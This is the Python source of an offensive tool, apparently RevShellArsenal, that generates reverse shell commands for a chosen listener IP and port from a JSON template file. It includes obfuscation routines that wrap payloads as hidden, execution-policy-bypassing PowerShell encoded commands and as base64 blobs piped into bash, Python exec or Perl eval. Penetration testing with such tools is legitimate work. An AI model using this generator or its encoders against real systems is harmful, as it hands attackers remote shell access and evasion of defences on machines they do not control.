#!/usr/bin/env python

"""
Title: RevShellArsenal
Filename: rsg.py
GitHub: https://github.com/itm4n/RevShellArsenal
Date: 2019-01-26
Author: Clement Labro (@itm4n)
Description: A small tool to generate reverse shell commands based on common techniques. 
"""

from __future__ import print_function
from base64 import b64encode
import os
import sys
import json
import argparse
import platform

# Text colors
C_RST = "\033[0m" if "linux" in platform.system().lower() else ""
C_GRE = "\033[92m" if "linux" in platform.system().lower() else ""
C_BLU = "\033[94m" if "linux" in platform.system().lower() else ""
C_YEL = "\033[93m" if "linux" in platform.system().lower() else ""
C_RED = "\033[91m" if "linux" in platform.system().lower() else ""

g_json_data = None
g_payload_count = 0

# Command encoding techniques 
# [BROKEN] https://jthuraisamy.github.io/archives.html/runtime-exec-payloads.html
# [CACHE] https://webcache.googleusercontent.com/search?q=cache:5AdcRIUec4sJ:https://jackson.thuraisamy.me/runtime-exec-payloads.html+&cd=1&hl=fr&ct=clnk&gl=fr
def encode_payload(payload, os_type, enc_type):
    res = ""
    if os_type == "windows":
        if enc_type == "powershell":
            res = "powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {}".format(b64encode(payload.encode('UTF-16LE')).decode('ascii'))
    elif os_type == "linux":
        if enc_type == "shell":
            res = "bash -c \"{echo,%s}|{base64,-d}|{bash,-i}\"" % b64encode(payload.encode(encoding='ascii')).decode('ascii')
        elif enc_type == "python":
            res = "python -c \"exec('%s'.decode('base64'))\"" % b64encode(payload.encode(encoding='ascii')).decode('ascii')
        elif enc_type == "perl":
            res = "perl -MMIME::Base64 -e \"eval(decode_base64('%s'))\"" % b64encode(payload.encode(encoding='ascii')).decode('ascii')
    else:
        print("{}[!] Unknown OS: {}{}".format(C_YEL, os_type, C_RST))
    return res

def print_payload(title, payload):
    if g_payload_count > 0:
        sys.stdout.write("\n")
    sys.stdout.write(title + "\n")
    print(payload)

def main():
    
    global g_json_data
    global g_payload_count
    
    dir_path = os.path.dirname(os.path.realpath(__file__))
    json_path = "{}/shells.json".format(dir_path)
    
    with open(json_path) as f:
        g_json_data = json.load(f)
        #g_json_data = json.load(f, object_hook=ascii_encode_dict)
    
    payloads = ['all']
    for i in range(len(g_json_data)):
        cur_type = g_json_data[i]["type"].lower()
        if not cur_type in payloads:
            payloads.append(g_json_data[i]["type"].lower())

    parser = argparse.ArgumentParser(description="RevShellArsenal - Reverse Shell Generator")
    parser.add_argument("payload", help="Payload (choose 'all' to generate all payloads)", choices=payloads)
    parser.add_argument("lhost", help="Local IP address")
    parser.add_argument("lport", help="Local port", type=int)
    parser.add_argument("--raw", help="Print raw payload instead of one-liner", action="store_true")
    parser.add_argument("--encode", help="Encode raw payload and print command", action="store_true")
    args = parser.parse_args()
    
    if args.raw == True and args.encode == True:
        print("{}[!] '--encode' specified, '--raw' will be ignored.{}".format(C_YEL, C_RST))
    
    g_payload_count = 0
    for i in range(len(g_json_data)):
        p_type = g_json_data[i]["type"]
        p_subtype = g_json_data[i]["subtype"]
        p_format = g_json_data[i]["format"]
        p_os = g_json_data[i]["os"]
        p_template = g_json_data[i]["template"]
        p_web_delivery = g_json_data[i]["web-delivery"]
        
        if args.payload.lower() == "all" or args.payload.lower() == p_type.lower() or ((p_type == "shell" or p_type == "cmd") and p_subtype == args.payload and p_format != "raw"):
            if (p_format == "raw" and args.raw == True) or (p_format != "raw" and args.raw == False) or (p_format == "raw" and args.encode == True):
                payload = p_template.replace("{LHOST}", args.lhost).replace("{LPORT}", str(args.lport)) 
                title = ""
                if p_type == p_subtype:
                    title = "[{}{}{}][{}{}{}]".format(C_RED, p_type.upper(), C_RST, C_BLU, "ENCODED" if args.encode else p_format.upper(), C_RST)
                else:
                    title = "[{}{}{}][{}{}{}][{}{}{}]".format(C_RED, p_type.upper(), C_RST, C_RED, p_subtype.upper(), C_RST, C_BLU, "ENCODED" if args.encode else p_format.upper(), C_RST)
                if args.encode == False:
                    print_payload(title, payload)
                    if p_web_delivery == True:
                        print("{}[!] A web server is required to host the payload.{}".format(C_YEL, C_RST))
                    g_payload_count += 1
                else:
                    payload_encoded = encode_payload(payload, p_os, p_type)
                    if payload_encoded != "":
                        print_payload(title, payload_encoded)
                        if p_web_delivery == True:
                            print("{}[!] A web server is required to host the payload.{}".format(C_YEL, C_RST))
                        g_payload_count += 1
    
    if g_payload_count == 0:
        print("{}[-] No matching payload found.{}".format(C_YEL, C_RST))

if __name__ == '__main__':
    main()

